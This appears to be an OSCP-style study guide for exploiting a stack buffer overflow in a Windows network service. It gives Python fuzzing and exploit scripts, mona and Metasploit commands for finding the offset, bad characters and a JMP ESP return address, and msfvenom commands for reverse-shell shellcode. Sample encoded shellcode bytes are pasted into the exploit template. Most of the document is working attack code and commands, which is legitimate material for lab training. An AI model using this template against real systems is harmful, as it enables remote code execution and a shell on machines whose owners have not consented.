# Buffer overflow
To find and exploit a buffer overflow the following steps should be executed:
   1. **Spiking:** Find the vulnerable parameter
   2. **Fuzzing:** Get the amount of bytes the program crashes
   3. **Find the offset:** Get the amount of bytes to write to the EIP
   4. **Overwriting the EIP**
   5. **Find bad characters:** Run all hex characters through the program
   6. **Finding the right module:** Look for a ddl without memory protections
   7. **Generating shellcode:** To get a reverse shell or to run calc
   
Make sure you got immunity debugger + mona.py installed
   
#### Spiking
1. Take the commands/options/parameters one at a time and send a bunch of data to see if it crashes
2. Use `generic_send_tcp <HOST> <PORT> <SPIKE SCRIPT> 0 0` to send a spike script
```
#EXAMPLE SPIKE SCRIPT
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

#### Fuzzing
1. Get the amount of bytes it crashes the program, the following ```fuzzing.py``` script could be used:
```
import socket, time, sys

ip = "<IP>"
port = <PORT>
prefix = ""
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(prefix + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

2. Edit the variables "IP", "Port" and "Prefix"

#### Find the offset
First execute ```!mona config -set workingfolder c:\mona\oscp```
1. Create a offset pattern with the amount of bytes +400 the program crashed.
  
   a) With metasploit 
   
   ```
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
   ```
  
   b) With mona 
   
   ```
   !mona pc <length>
   ```

2. Create a new script named ```exploit.py``` and set the offset pattern in the variable "payload"

```
import socket

ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = "" #"\x90" * 16
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

3.	Get the amound of offset bytes. 

    A) With Mona 

    ```
    !mona findmsp -distance <LENGTH OF GENERATED STRING>
    Check for output: EIP contains normal pattern : ... (offset XXXX)
     ```

    B) With Metasploit

    ```
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>
    ```

4. Update your exploit.py script and set the offset variable to this value (was previously set to 0). 

#### Overwriting the EIP
1. Set the payload variable to an empty string again. Set the retn variable to "BBBB".
2. Execute the script and check in Immunity Debuffer if the EIP is overwritten with 4 B's (42424242)

#### Find bad characters
1. Get a list of bad characters from https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ or https://github.com/cytopia/badchars
2. Edit the exploit.py script and change the payload to send the bad characters (\x00 is already missing, but \x0a and \x0d are populair bad characters to. Probably should remove them aswell!)
```
payload = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

3. Run the following in Immunity Debugger
```
!mona bytearray -b "\x00"
!mona bytearray -b "\x00\x01"
```
4. Run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following Mona command:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

   A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file. Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string(dont write the next bytes down). The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. 

5. Generate a new bytearray in mona, specifying the badchars. Then update the payload variable in your exploit.py script and remove the new badchars as well. Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
```
!mona bytearray -b "<BADCHARS>"
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
```

#### Finding the right module
1. Finding the right module

   A) Run the following command
   ```
   !mona jmp -r esp -cpb "<BACHARS>"
   ```
   This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

  B) CyberMentor way
     1. See all the module by executing `!mona modules` in the Immunity Debugger console.
     2. Check all the protection settings (Rebase, SafeSEN, ASLR, NXCompat, OS dll)
     3. Look for a vulnerable dll with all falses and write down the .dll
     4. Find the upcode equivalant of a jump use `nasm_shell.rb`
     ```
     JMP ESP 
     output = \xff\xe4
     ```
     5. Get the all the JMP ESP return adressess `!mona find -s "\xff\xe4" -m <.dll file>`

2. Write down all the JMP ESP return adresses
3. Choose an address and update your exploit.py script, setting the "retn" variable to the address and empty the "payload" variable.
If program is 32 bit, write it backwards. (little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
```
retn = "\xaf\x11\x50\x62"
```
4. Click on the blue arrow in Immunity Debugger and enter the return adress, hit F2 to mark it blue and set a break point. Check the EIP value. If the EIP value == return/ESP adress we control the EIP

#### Generating shellcode
1. Generate shellcode with msfvenom (reverse shell)

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "<BADCHARS>"
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<BADCHARS>"
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "<BADCHARS>" -f py
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -e x86/alpha_mixed
```

2. Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code
```
payload = (
"\xba\x9f\x88\x46\xeb\xda\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x83\xee\xfc\x03\xc9\x86\xa4\x1e\x09\x7e\xaa"
"\xe1\xf1\x7f\xcb\x68\x14\x4e\xcb\x0f\x5d\xe1\xfb\x44\x33\x0e"
"\x77\x08\xa7\x85\xf5\x85\xc8\x2e\xb3\xf3\xe7\xaf\xe8\xc0\x66"
"\x2c\xf3\x14\x48\x0d\x3c\x69\x89\x4a\x21\x80\xdb\x03\x2d\x37"
"\xcb\x20\x7b\x84\x60\x7a\x6d\x8c\x95\xcb\x8c\xbd\x08\x47\xd7"
"\x1d\xab\x84\x63\x14\xb3\xc9\x4e\xee\x48\x39\x24\xf1\x98\x73"
"\xc5\x5e\xe5\xbb\x34\x9e\x22\x7b\xa7\xd5\x5a\x7f\x5a\xee\x99")

or

buf =  b""
buf += b"\xbb\xbd\xb1\x86\xfa\xdb\xc5\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x7f\xb5\x64"
buf += b"\x0f\x83\x5e\xea\xf0\x7b\x9f\x8b\x79\x9e\xae\x8b\x1e"
buf += b"\xeb\x81\x3b\x54\xb9\x2d\xb7\x38\x29\xa5\xb5\x94\x5e"
buf += b"\x1e\x70\xe0\x8e\x98\x69\x98\x9f\x4c\x8d\x0f\x9f\x44"
payload = buf
```

3. Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
```
padding = "\x90" * 16
```

4. Start a listener and run exploit.py

5. Now recreate a payload for the target in the lab/exam and run it!
